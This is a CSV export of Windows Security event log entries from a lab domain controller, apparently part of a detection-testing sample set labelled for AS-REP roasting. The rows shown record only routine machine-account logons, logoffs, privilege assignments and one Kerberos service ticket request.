24,37883,2021-04-29 07:58:02.7650688,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC7142B,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC7142B""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
25,37884,2021-04-29 07:58:02.7651012,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC713DD,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC713DD""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
26,37885,2021-04-29 07:58:02.7682393,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC712F1,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC712F1""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
27,37886,2021-04-29 07:58:13.4575936,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC714D9,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC714D9""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
28,37887,2021-04-29 07:58:22.9202696,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC72AE1,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC72AE1""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
29,37888,2021-04-29 07:58:22.9205724,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (::1)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC72AE1,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC72AE1""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""58839562-92e0-e8d6-3d3c-c1aeed5c31f6""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""54378""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
30,37889,2021-04-29 07:58:22.9254572,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC72AE1,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC72AE1""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
31,37890,2021-04-29 07:58:28.4229078,4769,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,A Kerberos service ticket was requested,,::1:0,Target: LABCORP.LOCAL\DC-SERVER-1$@LABCORP.LOCAL,ServiceName: DC-SERVER-1$,ServiceSid: S-1-5-21-2662618741-3450174888-1698379039-1000,TicketEncryptionType: AES256-CTS-HMAC-SHA1-96,Status: KDC_ERR_NONE - No error - No errors were found.,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$@LABCORP.LOCAL""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""ServiceName"",""#text"":""DC-SERVER-1$""},{""@Name"":""ServiceSid"",""#text"":""S-1-5-21-2662618741-3450174888-1698379039-1000""},{""@Name"":""TicketOptions"",""#text"":""0x40810000""},{""@Name"":""TicketEncryptionType"",""#text"":""0x12""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""0""},{""@Name"":""Status"",""#text"":""0x0""},{""@Name"":""LogonGuid"",""#text"":""46745809-bf31-91f6-df7c-4b0759421d42""},{""@Name"":""TransmittedServices"",""#text"":""-""}]}}"
32,37891,2021-04-29 07:58:28.4249645,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC7313F,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC7313F""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
33,37892,2021-04-29 07:58:28.4254456,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (fe80::e50e:b89e:4718:3aa)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC7313F,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC7313F""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""df7dfc5d-85be-545b-0d4a-1088fde0a2af""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::e50e:b89e:4718:3aa""},{""@Name"":""IpPort"",""#text"":""54379""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1840""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
34,37893,2021-04-29 07:58:39.1458177,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC7313F,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC7313F""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
35,37894,2021-04-29 07:59:22.9287973,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC74E3E,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC74E3E""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
36,37895,2021-04-29 07:59:22.9289808,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2324,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (::1)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC74E3E,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC74E3E""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""58839562-92e0-e8d6-3d3c-c1aeed5c31f6""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""::1""},{""@Name"":""IpPort"",""#text"":""54383""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
37,37896,2021-04-29 07:59:22.9306293,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC74E3E,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC74E3E""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
38,37897,2021-04-29 07:59:42.5374209,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1596,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC7ADB8,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC7ADB8""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
39,37898,2021-04-29 07:59:42.5375236,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1596,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (fe80::e50e:b89e:4718:3aa)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC7ADB8,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC7ADB8""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""58839562-92e0-e8d6-3d3c-c1aeed5c31f6""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::e50e:b89e:4718:3aa""},{""@Name"":""IpPort"",""#text"":""54388""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
40,37899,2021-04-29 07:59:42.5429276,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2240,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC7ADB8,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC7ADB8""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
41,37900,2021-04-29 07:59:42.5451096,4672,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1596,DC-Server-1.labcorp.local,0,,Administrative logon,LABCORP\DC-SERVER-1$ (S-1-5-18),,"PrivilegeList: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege",LogonId: 0xC7AE25,,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-5-18""},{""@Name"":""SubjectUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""SubjectDomainName"",""#text"":""LABCORP""},{""@Name"":""SubjectLogonId"",""#text"":""0xC7AE25""},{""@Name"":""PrivilegeList"",""#text"":""SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, SeLoadDriverPrivilege, SeImpersonatePrivilege, SeDelegateSessionUserImpersonatePrivilege, SeEnableDelegationPrivilege""}]}}"
42,37901,2021-04-29 07:59:42.5452184,4624,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,1596,DC-Server-1.labcorp.local,0,,Successful logon,-\-," (fe80::e50e:b89e:4718:3aa)",Target: LABCORP.LOCAL\DC-SERVER-1$,LogonType 3,LogonId: 0xC7AE25,,,,-,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""SubjectUserSid"",""#text"":""S-1-0-0""},{""@Name"":""SubjectUserName"",""#text"":""-""},{""@Name"":""SubjectDomainName"",""#text"":""-""},{""@Name"":""SubjectLogonId"",""#text"":""0x0""},{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP.LOCAL""},{""@Name"":""TargetLogonId"",""#text"":""0xC7AE25""},{""@Name"":""LogonType"",""#text"":""3""},{""@Name"":""LogonProcessName"",""#text"":""Kerberos""},{""@Name"":""AuthenticationPackageName"",""#text"":""Kerberos""},{""@Name"":""WorkstationName""},{""@Name"":""LogonGuid"",""#text"":""58839562-92e0-e8d6-3d3c-c1aeed5c31f6""},{""@Name"":""TransmittedServices"",""#text"":""-""},{""@Name"":""LmPackageName"",""#text"":""-""},{""@Name"":""KeyLength"",""#text"":""0""},{""@Name"":""ProcessId"",""#text"":""0x0""},{""@Name"":""ProcessName"",""#text"":""-""},{""@Name"":""IpAddress"",""#text"":""fe80::e50e:b89e:4718:3aa""},{""@Name"":""IpPort"",""#text"":""54389""},{""@Name"":""ImpersonationLevel"",""#text"":""%%1833""},{""@Name"":""RestrictedAdminMode"",""#text"":""-""},{""@Name"":""TargetOutboundUserName"",""#text"":""-""},{""@Name"":""TargetOutboundDomainName"",""#text"":""-""},{""@Name"":""VirtualAccount"",""#text"":""%%1843""},{""@Name"":""TargetLinkedLogonId"",""#text"":""0x0""},{""@Name"":""ElevatedToken"",""#text"":""%%1842""}]}}"
43,37902,2021-04-29 07:59:42.5525325,4634,LogAlways,Microsoft-Windows-Security-Auditing,Security,608,2740,DC-Server-1.labcorp.local,0,,An account was logged off,,,Target: LABCORP\DC-SERVER-1$,LogonType 3,LogonId: 0xC7AE25,,,,,False,/evidence/windows-evtx-hayabusa-samples/CredentialAccess/T1558.004_StealOrForgeKerberosTicketsAS-REP-Roasting_Security.evtx,Audit success,0,"{""EventData"":{""Data"":[{""@Name"":""TargetUserSid"",""#text"":""S-1-5-18""},{""@Name"":""TargetUserName"",""#text"":""DC-SERVER-1$""},{""@Name"":""TargetDomainName"",""#text"":""LABCORP""},{""@Name"":""TargetLogonId"",""#text"":""0xC7AE25""},{""@Name"":""LogonType"",""#text"":""3""}]}}"
